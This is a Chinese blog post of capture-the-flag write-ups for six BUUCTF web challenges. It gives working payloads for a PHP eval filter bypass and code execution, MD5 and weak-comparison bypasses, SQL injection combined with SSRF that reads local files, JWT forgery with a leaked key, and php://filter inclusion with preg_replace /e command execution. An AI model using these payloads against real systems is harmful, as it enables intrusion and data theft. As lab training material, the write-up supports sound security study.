# BUUCTF——WEB刷题记录


## [RoarCTF 2019]Easy Calc

考点：命令执行

![image-20250422124222537](https://hinoatari.github.io/images/web刷题/1-1.png)

查看网页源码后发现存在calc.php页面，且提示存在waf

```javascript
$('#calc').submit(function(){
    $.ajax({
        url:"calc.php?num="+encodeURIComponent($("#content").val()),
        type:'GET',
        success:function(data){
            $("#result").html(`<div class="alert alert-success">
        <strong>答案:</strong>${data}
        </div>`);
        },
        error:function(){
            alert("这啥?算不来!");
        }
    })
    return false;
})
```

**访问calc.php：**

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

**waf绕过：**

直接传入num会报错，应该是被waf过滤了，这里可以使用**空格绕过waf**，原理为：PHP代码处理输入参数时会将参数前后多余的空白符（空格、回车、制表符）删除，因此传入?%20num后能够绕过waf，PHP在解析时又会将?%20num当作?num。

**命令执行：**

![](https://hinoatari.github.io/images/web刷题/1-2.png)

查看phpinfo，发现过滤了很多执行函数，但没有过滤var_dump、scandir、file_get_contents，构造参数?%20num=var_dump(scandir(chr(47)))，因为"\\"被过滤了，使用chr(47)替代"\\"，查看根目录信息

![image-20250422125800793](https://hinoatari.github.io/images/web刷题/1-3.png)

发现f1agg，构造参数`?%20num=var_dump(file_get_contents(chr(47).f1agg))`即可获取flag。`flag{9f0a644e-780d-47ff-b1b3-87f2568f3fc0} `

**其它方法：**

参考链接：`https://blog.csdn.net/m0_73612768/article/details/135013881`，发现还有一种命令执行的方法，构造payload`? num=1;eval(end(pos(get_defined_vars())))&nss=phpinfo();`，

get_defined_vars()：返回由所有已定义变量所组成的数组，会返回 GET , POST , COOKIE, FILES 全局变量的值，返回数组顺序为 get->post->cookie->files 。

pos()：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回 $_GET 变量的数组值。

end()：将内部指针指向数组中的最后一个元素，并输出。即新加入的参数 nss 。最后由 eval() 函数执行，使得 get 方式的参数 nss 生效。这样的话就可以再利用 nss 传参了，由于代码只对 num 参数的值做了过滤，因此 nss 参数理论上可以造成任意代码执行。

构造payload：`? num=1;eval(end(pos(get_defined_vars())))&nss=include("/f1agg");`即可获得flag。



## [ACTF2020 新生赛]BackupFile

扫网站备份文件，存在index.php.bak文件，打开后进行php代码审计

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

考点：php弱类型比较。在php中= =为弱比较，当整数类型和字符串类型比较时，字符串先被转换成整数类型后再与整数类型进行比较。由于$str=\"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"，只需要传入123即可令$key == $str。



## [BJDCTF2020]Easy MD5

burp抓包发送后发现hint: select * from 'admin' where password=md5($pass,true)。`md5($pass,true)`的作用是返回原始二进制数的md5值。这里可以使用`ffifdyop`绕过，原理为：ffifdyop被md5加密后变成 `276f722736c95d99e921722cf9ed621c`，这个字符串前几位刚好是  `' or '6`，相当于万能密码，因此可以绕过md5()函数。

传入ffifdyop后进入levels91.php，发包后返回信息中有一条：

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];
if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

典型的md5弱比较绕过，传入两个不相等但是哈希后值相等的字符串即可

```markdown
# 这些字符串的md5值都是0e开头，在php弱类型比较中判断为相等
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
```

进入下一关：levell14.php

```php
 <?php
error_reporting(0);
include "flag.php";
highlight_file(__FILE__);
if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 
```

md5强比较，用`param1[]=1&param2[]=2`即可绕过。`flag{17b7a715-330f-4e08-9da2-702ca8d50c83}`



## [网鼎杯 2018]Fakebook

考点：ssrf、sql注入

进入环境需要注册，注册并登录后发现点击用户名后可以查看该用户的博客信息，在/view.php?no=中传入不同的值可以查看不同的用户，猜测存在sql注入。构造语句1 and 1=1 --+和1 and 1=2 --+，分别传入后发现后者报错，说明存在数字型注入

构造order by语句发现存在4个字段

构造1 union select 1,2,3,4 --+传入后回显no hack，存在过滤。使用内联注入可绕过，1 union/**/select 1,2,3,4 --+

后面就是查表、列、字段信息，发现没有和flag相关的信息，但是存在一条php序列化后的数据：

![](https://hinoatari.github.io/images/web刷题/1-3.png)

在robots.txt中发现还有备份文件：`user.php.bak`，下载后进行代码审计

```php
<?php


class UserInfo
{
    public $name ;
    public $age=0;
    public $blog;

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
}
```

下面的内容是核心部分，这段代码会导致ssrf漏洞，用户可控制的blog的值，且curl_setopt($ch, CURLOPT_URL, $url) 直接使用用户输入的 URL，没有任何防护，用户可通过get方法用curl发起请求。

```php
    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }
```

构造序列化数据通过sql注入传参即可获得base64加密后的flag

```php
$a = new UserInfo("admin",19,"file:///var/www/html/flag.php");
echo serialize($a);
```

```
/view.php?no=-1/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' from fakebook.users#
```

**$flag = "flag{d86979c3-8339-437c-a678-c7f815536604}";**



## [RootersCTF2019]ImgXweb

考点：jwt伪造

注册账号登录后可以看到存在加密后的cookie，解密后将user改成admin，还需要一个密钥。

在robots.txt中找到一个路径：/static/secretkey.txt，访问后得到密钥you-will-never-guess，jwt加密后将原本的cookie替换成自己修改后的cookie：`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.g_lGU4qTO2VhNrZK9k460xz828GcqKBayZPcmLmhUqE`

刷新后即可看到已经以admin身份登录，并且存在三个png图像，其中一个还是flag.png

![](https://hinoatari.github.io/images/web刷题/1-4.png)

直接访问图像路径会显示图像存在错误而无法访问，用burp访问后即可得到flag

`flag{1b4973b0-b93b-4cb6-88a3-d7e8db30e0b0}`



## [BJDCTF2020]ZJCTF，不过如此

考点：文件包含、命令执行

代码审计：

```php
<?php
error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }
    include($file);  //next.php
}
else{
    highlight_file(__FILE__);
}
?>
```

提示了需要包含next.php，这里使用php伪协议读取文件，同时利用php://input执行post数据中的php代码

`?text=php://input&file=php://filter/read=convert.base64-encode/resource=next.php`

同时post字符串I have a dream

即可获得base64加密后的数据，解密后得

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}

```

分析一下，complex函数需要参数\$re、\$str，并且两个参数都可控，这个函数的作用时如果str中匹配到了满足/(' . $re . ')/ei的字符串就执行strtolower("\\1")，并且由于存在e参数，php会执行第二个参数，即eval(strtolower("\1"))。getFlag函数中存在eval函数，通过传递cmd执行命令，但@eval()默认不会被调用，需要通过其它的方式触发。

查询资料得知\\1涉及一个叫做**反向引用**的知识点：

```markdown
# 对一个正则表达式模式或部分模式两边添加圆括号,将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。所以这里的 \1 实际上指定的是第一个子匹配项
```

如果我们构造payload：`?.*={${phpinfo()}}`，php处理的语句就会变成`preg_replace('/(.*)/ei', 'strtolower("\\1")', ${phpinfo()});`单看这条语句，`/(.*)/`ei会匹配\$\{phpinfo()\}的全部内容，并在`strtolower`中反向引用，变成`strtolower(${phpinfo()})`，由于正则表达式中存在e参数，phpinfo()将被当做php代码执行。但本题中该payload没有执行，原因是在PHP中，对于传入的非法的$_GET数组参数名，会将其转化为下划线，导致了正则匹配失效。因此需要将.替换成\S。

构造payload：`?\S*=${getFlag()}&cmd=passthru("ls /")`，发现存在flag，利用cat /flag读取就能获得flag。

`flag{ebc21d3d-fc88-4db7-b2bc-8d81e0863930}`


---

> 作者: Hinoatari  
> URL: https://hinoatari.github.io/posts/buuctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/  

